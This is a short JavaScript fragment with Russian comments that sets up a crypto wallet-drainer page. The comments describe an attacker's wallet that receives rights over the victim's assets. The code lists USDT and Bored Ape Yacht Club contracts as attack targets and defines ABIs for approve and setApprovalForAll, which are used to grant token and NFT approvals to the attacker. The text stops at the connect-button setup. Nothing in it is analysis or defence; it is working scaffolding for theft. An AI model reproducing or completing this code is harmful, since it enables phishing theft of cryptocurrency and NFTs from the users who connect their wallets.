// --- КОНФИГУРАЦИЯ ---
// Сюда вставь свой кошелек. Это адрес, который получит права на активы жертвы.
const attackerAddress = "TZD6PCN6rPiRrHqRyi5JvmMJrRYpNTwJP9";

// Адреса контрактов для атаки. Можешь добавить сколько угодно.
// USDT (ERC20)
const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
// Bored Ape Yacht Club (ERC721 - NFT)
const baycContractAddress = "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D";


// --- ABIs (Application Binary Interfaces) ---
// Минимальные ABI для нужных нам функций
const erc20_abi = [
    "function approve(address spender, uint256 amount) public returns (bool)"
];
const erc721_abi = [
    "function setApprovalForAll(address operator, bool approved) public"
];


// --- ЭЛЕМЕНТЫ DOM ---
const connectButton = document.getElementById('connectButton')